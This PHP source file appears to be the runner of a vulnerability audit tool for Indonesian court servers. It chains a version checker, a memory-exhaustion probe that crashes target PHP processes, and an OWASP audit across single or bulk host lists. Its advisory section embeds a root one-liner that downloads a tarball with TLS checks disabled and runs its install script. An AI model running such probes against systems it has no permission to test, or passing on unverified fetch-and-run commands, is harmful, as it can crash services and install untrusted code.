<?php
/**
 * Unified Security Audit Runner
 * 
 * Fundamental Security Audit Engine orchestrating:
 * 1. NetworkPreFlight (DNS, TCP, HTTP reachability verification)
 * 2. OpenAI phpcheck (engines/p2s-checker/phpcheck.js)
 * 3. Assetnote multipart memory probe (engines/p2s-scanner/scanner.py)
 * 4. OWASP Top 10 & Server Hardening Auditor (core/OwaspAuditor.php)
 */

require_once __DIR__ . '/NetworkPreFlight.php';
require_once __DIR__ . '/OwaspAuditor.php';
require_once __DIR__ . '/TaskQueue.php';

class AuditRunner {

    private string $pythonBin;
    private string $nodeBin;
    private string $scannerScript;
    private string $checkerScript;
    private TaskQueue $queue;
    private OwaspAuditor $owaspAuditor;

    public function __construct() {
        $laragonPython = 'C:\\laragon\\bin\\python\\python-3.13\\python.exe';
        $this->pythonBin = file_exists($laragonPython) ? $laragonPython : 'python';

        $nodeProgFiles = 'C:\\Program Files\\nodejs\\node.exe';
        $this->nodeBin = file_exists($nodeProgFiles) ? $nodeProgFiles : 'node';

        $baseDir = dirname(__DIR__);
        $this->scannerScript = $baseDir . DIRECTORY_SEPARATOR . 'engines' . DIRECTORY_SEPARATOR . 'p2s-scanner' . DIRECTORY_SEPARATOR . 'scanner.py';
        $this->checkerScript = $baseDir . DIRECTORY_SEPARATOR . 'engines' . DIRECTORY_SEPARATOR . 'p2s-checker' . DIRECTORY_SEPARATOR . 'phpcheck.js';

        $this->queue = new TaskQueue();
        $this->owaspAuditor = new OwaspAuditor(12, false);
    }

    /**
     * Audit a single host synchronously with Pre-Flight gate
     */
    public function auditSingle(string $url, array $options = []): array {
        $originIp = !empty($options['origin_ip']) && filter_var($options['origin_ip'], FILTER_VALIDATE_IP) ? trim($options['origin_ip']) : null;

        // Step 1: Pre-Flight Reachability Gate (with Direct Origin IP support)
        $preflight = NetworkPreFlight::verifyTarget($url, 4, $originIp);

        if (!$preflight['reachable']) {
            return [
                'success' => true,
                'target' => $url,
                'is_reachable' => false,
                'direct_origin_ip' => $originIp,
                'is_direct_origin' => !empty($originIp),
                'overall_risk' => 'UNREACHABLE',
                'unreachable_details' => [
                    'error_type' => $preflight['error_type'],
                    'title' => $preflight['title'],
                    'message' => $preflight['message']
                ],
                'php2shell' => [
                    'vulnerable' => null,
                    'status' => 'UNREACHABLE',
                    'reason' => $preflight['message'],
                    'evidence' => null,
                    'probe_engine' => 'Assetnote Progressive Fuzzer (engines/p2s-scanner)',
                    'checker_engine' => 'OpenAI phpcheck (engines/p2s-checker)'
                ],
                'owasp' => [
                    'success' => false,
                    'unreachable' => true,
                    'score' => null,
                    'grade' => 'N/A',
                    'findings' => [],
                    'error' => $preflight['message']
                ],
                'scanned_at' => gmdate('Y-m-d\TH:i:s\Z')
            ];
        }

        $cleanUrl = $preflight['clean_url'];

        // Step 2: Run OpenAI phpcheck Engine (Node.js)
        $checkerResult = $this->runOpenAiChecker($cleanUrl, $options);

        // Step 3: Run Assetnote Progressive Memory Probe Engine (Python)
        $probeResult = $this->runAssetnoteScanner($cleanUrl, $options);

        // Step 4: Run OWASP Top 10 & Server Hardening Auditor (PHP)
        $owaspResult = $this->owaspAuditor->audit($cleanUrl, $originIp);

        // Step 5: Consolidate PHP2Shell Assessment
        $detectedPhpVersion = $checkerResult['php_version'] 
            ?? self::extractPhpVersion($probeResult['powered_by'] ?? null)
            ?? self::extractPhpVersion($owaspResult['headers']['x-powered-by'] ?? null);

        $isProbeVuln = ($probeResult['vulnerable'] ?? false) === true;
        $isCheckerPotentiallyVuln = ($checkerResult['patch_status'] ?? '') === 'potentially_vulnerable';
        $isCheckerVuln = ($checkerResult['patch_status'] ?? '') === 'vulnerable';

        // Cross-engine validation: If checker missed version but probe/owasp captured vulnerable version
        if (!$isCheckerVuln && !$isCheckerPotentiallyVuln && $detectedPhpVersion) {
            if (self::isPhpVersionVulnerable($detectedPhpVersion)) {
                $isCheckerPotentiallyVuln = true;
            }
        }

        $php2shellVuln = $isProbeVuln || $isCheckerVuln;
        $php2shellStatus = 'SAFE';

        if ($isProbeVuln) {
            $php2shellStatus = 'VULNERABLE (Memory Crash Confirmed)';
            $php2shellReason = $probeResult['reason'] ?: 'Eksploitasi memory exhaustion berhasil memicu crash pada proses PHP target.';
        } elseif ($isCheckerVuln) {
            $php2shellStatus = 'VULNERABLE (Unpatched Version)';
            $php2shellReason = $checkerResult['reason'] ?: 'Versi PHP target teridentifikasi rentan terhadap CVE-2026-109618/19.';
        } elseif ($isCheckerPotentiallyVuln) {
            $php2shellStatus = 'POTENTIALLY_VULNERABLE';
            $php2shellReason = 'Versi PHP teridentifikasi rentan (' . ($detectedPhpVersion ?? 'Unknown') . '). Memory probe belum memicu crash (kemungkinan upload progress dinonaktifkan atau terlindungi WAF).';
        } else {
            $php2shellStatus = 'PATCHED / SAFE';
            $php2shellReason = 'Target tidak rentan terhadap PHP2Shell. ' . ($checkerResult['reason'] ?? 'Respon memory normal.');
        }

        $php2shellConsolidated = [
            'vulnerable' => $php2shellVuln,
            'status' => $php2shellStatus,
            'reason' => $php2shellReason,
            'php_version' => $detectedPhpVersion,
            'probe' => $probeResult,
            'checker' => $checkerResult,
            'evidence' => $probeResult['evidence'] ?? null
        ];

        // SIPP Mahkamah Agung Badilum Intelligence Evaluation
        $rawVersion = (string)($detectedPhpVersion ?? '');
        $serverHeader = (string)($owaspResult['headers']['server'] ?? $probeResult['server'] ?? '');
        $isUbuntuDebianServer = (stripos($serverHeader, 'ubuntu') !== false || stripos($serverHeader, 'debian') !== false);
        $isCentos7Legacy = ((strpos($rawVersion, '5.6') !== false || strpos($rawVersion, '5.4') !== false) && !$isUbuntuDebianServer);
        $isMariPatched = (strpos((string)($probeResult['evidence'] ?? ''), 'Custom Built MA RI') !== false);

        if ($isCentos7Legacy) {
            $php2shellConsolidated['sipp_badilum_advisory'] = [
                'surat_no' => '135/DJU.3/TI1.1.1/X/2026',
                'is_mari_patched' => $isMariPatched,
                'status_label' => $isMariPatched ? 'TERPASANG PATCH RESMI MA-RI' : 'LEVEL BERBAHAYA (BELUM PATCH RESMI MA-RI)',
                'action_url' => 'https://office.pt-yogyakarta.go.id/php-5.6-mari-centos7-20261024.tar.gz',
                'one_liner' => 'cd /root && curl -kL https://office.pt-yogyakarta.go.id/php-5.6-mari-centos7-20261024.tar.gz -o php-5.6-mari-centos7-20261024.tar.gz && tar -zxvf php-5.6-mari-centos7-20261024.tar.gz && cd php56-dist && chmod +x install.sh && ./install.sh'
            ];
        } elseif ($isUbuntuDebianServer) {
            $php2shellConsolidated['distro_advisory'] = [
                'distro' => 'Ubuntu/Debian',
                'message' => 'Target berjalan pada Ubuntu/Debian. Patch biner CentOS 7 MA-RI tidak berlaku. Lakukan pembaruan biner PHP via APT atau kunci konfigurasi php.ini.'
            ];
        }

        // Step 6: Compute Consolidated Risk Rating
        $overallRisk = 'LOW';
        if ($php2shellVuln) {
            $overallRisk = 'CRITICAL';
        } elseif ($isCheckerPotentiallyVuln || ($owaspResult['score'] ?? 100) < 55) {
            $overallRisk = 'HIGH';
        } elseif (($owaspResult['score'] ?? 100) < 75) {
            $overallRisk = 'MEDIUM';
        }

        return [
            'success' => true,
            'target' => $cleanUrl,
            'is_reachable' => true,
            'resolved_ip' => $preflight['resolved_ip'] ?? '',
            'direct_origin_ip' => $originIp,
            'is_direct_origin' => !empty($originIp),
            'overall_risk' => $overallRisk,
            'php2shell' => $php2shellConsolidated,
            'owasp' => $owaspResult,
            'scanned_at' => gmdate('Y-m-d\TH:i:s\Z')
        ];
    }

    /**
     * Executes bulk scan asynchronously via task queue
     */
    public function processTask(string $scanId): void {
        $task = $this->queue->getTask($scanId);
        if (!$task || empty($task['hosts'])) {
            return;
        }

        $task['status'] = 'running';
        $this->queue->saveTask($scanId, $task);

        $hosts = $task['hosts'];
        $total = count($hosts);
        $options = $task['options'] ?? [];

        foreach ($hosts as $index => $host) {
            $task['current_host'] = $host;
            $task['processed_hosts'] = $index;
            $task['progress'] = (int)(($index / $total) * 100);
            $this->queue->saveTask($scanId, $task);

            $result = $this->auditSingle($host, $options);
            $task['results'][] = $result;

            $task['processed_hosts'] = $index + 1;
            $task['progress'] = (int)((($index + 1) / $total) * 100);
            $this->queue->saveTask($scanId, $task);
        }

        $task['status'] = 'completed';
        $task['current_host'] = '';
        $task['progress'] = 100;
        $this->queue->saveTask($scanId, $task);
    }

    /**
     * Engine: OpenAI phpcheck.js runner (engines/p2s-checker)
     */
    private function runOpenAiChecker(string $url, array $options = []): array {
        if (!file_exists($this->checkerScript)) {
            return [
                'patch_status' => 'unknown',
                'reason' => 'Engine phpcheck.js tidak ditemukan pada path engines/p2s-checker/phpcheck.js',
                'php_version' => null
            ];
        }

        $timeout = (int)($options['timeout'] ?? 15);
        $args = [
            $this->nodeBin,
            $this->checkerScript,
            $url,
            '--timeout', (string)$timeout,
            '--json'
        ];

        if (!empty($options['origin_ip']) && filter_var($options['origin_ip'], FILTER_VALIDATE_IP)) {
            $args[] = '--origin-ip';
            $args[] = trim($options['origin_ip']);
        }

        $cmd = implode(' ', array_map('escapeshellarg', $args));
        $output = @shell_exec($cmd . ' 2>&1');

        if ($output) {
            $trimmed = trim($output);
            $parsed = json_decode($trimmed, true);
            if (is_array($parsed) && isset($parsed['patch_status'])) {
                return $parsed;
            }
        }

        return [
            'patch_status' => 'unknown',
            'reason' => 'Gagal membaca respon dari OpenAI phpcheck',
            'php_version' => null
        ];
    }

    /**
     * Engine: Assetnote progressive memory probe runner (engines/p2s-scanner)
     */
    private function runAssetnoteScanner(string $url, array $options = []): array {
        if (!file_exists($this->scannerScript)) {
            return [
                'vulnerable' => false,
                'reason' => 'Engine scanner.py tidak ditemukan pada path engines/p2s-scanner/scanner.py',
                'evidence' => null
            ];
        }

        $tempOut = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'p2s_' . bin2hex(random_bytes(6)) . '.json';
        $sapi = in_array($options['sapi'] ?? '', ['auto', 'mod_php', 'fpm'], true) ? $options['sapi'] : 'auto';
        $timeout = (int)($options['timeout'] ?? 30);
        if ($timeout < 5 || $timeout > 120) $timeout = 30;

        $args = [
            $this->pythonBin,
            $this->scannerScript,
            '-u', $url,
            '--follow-redirects',
            '--sapi', $sapi,
            '--timeout', (string)$timeout,
            '-k', // Insecure TLS to inspect self-signed court intranet hosts
            '--all-results',
            '-o', $tempOut,
            '--no-color',
            '-q'
        ];

        if (!empty($options['path'])) {
            $args[] = '--path';
            $args[] = $options['path'];
        }

        if (!empty($options['origin_ip']) && filter_var($options['origin_ip'], FILTER_VALIDATE_IP)) {
            $args[] = '--origin-ip';
            $args[] = trim($options['origin_ip']);
        }

        $cmd = implode(' ', array_map('escapeshellarg', $args));
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];

        $process = proc_open($cmd, $descriptors, $pipes);
        if (!is_resource($process)) {
            return [
                'vulnerable' => null,
                'reason' => 'Gagal mengeksekusi engine scanner.py'
            ];
        }

        fclose($pipes[0]);
        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);
        $exitCode = proc_close($process);

        $data = null;
        if (file_exists($tempOut)) {
            $jsonContent = file_get_contents($tempOut);
            $parsed = json_decode($jsonContent, true);
            @unlink($tempOut);

            if (is_array($parsed)) {
                if (isset($parsed['results'][0])) {
                    $data = $parsed['results'][0];
                } elseif (isset($parsed[0])) {
                    $data = $parsed[0];
                } elseif (isset($parsed['vulnerable']) || isset($parsed['verdict'])) {
                    $data = $parsed;
                }
            }
        }

        if ($data) {
            $isVuln = ($data['vulnerable'] ?? false) === true || ($data['verdict'] ?? '') === 'VULNERABLE';
            return [
                'vulnerable' => $isVuln,
                'verdict' => $data['verdict'] ?? ($isVuln ? 'VULNERABLE' : 'SAFE'),
                'reason' => $data['reason'] ?? '',
                'powered_by' => $data['powered_by'] ?? '',
                'sapi' => $data['sapi'] ?? '',
                'evidence' => $data['response'] ?? ($data['reason'] ?? null)
            ];
        }

        return [
            'vulnerable' => ($exitCode === 1),
            'verdict' => ($exitCode === 1 ? 'VULNERABLE' : 'SAFE'),
            'reason' => ($exitCode === 1 ? 'Target menunjukkan anomali memory crash / vulnerable' : 'Tidak terdeteksi respon memory exhaustion'),
            'evidence' => $stderr ?: $stdout
        ];
    }

    /**
     * Helper to extract clean PHP version string from headers
     */
    public static function extractPhpVersion(?string $header): ?string {
        if (!$header) return null;
        if (preg_match('/\bPHP[ \/]([0-9]+(?:\.[0-9]+)+)/i', $header, $m)) {
            return $m[1];
        }
        return null;
    }

    /**
     * Evaluates if a given PHP version string falls into CVE-2026-109618/19 vulnerable branches
     */
    public static function isPhpVersionVulnerable(?string $version): bool {
        if (!$version) return false;
        if (preg_match('/^([0-9]+)\.([0-9]+)(?:\.([0-9]+))?/', $version, $m)) {
            $major = (int)$m[1];
            $minor = (int)$m[2];
            $patch = isset($m[3]) ? (int)$m[3] : 0;
            $branch = "$major.$minor";
            // Older unmaintained EOL branches: 5.4, 5.5, 5.6, 7.0, 7.1, 7.2, 7.3, 7.4, 8.0, 8.1
            $olderBranches = ['5.4', '5.5', '5.6', '7.0', '7.1', '7.2', '7.3', '7.4', '8.0', '8.1'];
            if (in_array($branch, $olderBranches, true)) {
                return true;
            }
            // Patched upstream releases published 2026-10-21
            $fixedIn = ['8.2' => 35, '8.3' => 36, '8.4' => 27, '8.5' => 12];
            if (isset($fixedIn[$branch]) && $patch < $fixedIn[$branch]) {
                return true;
            }
        }
        return false;
    }
}
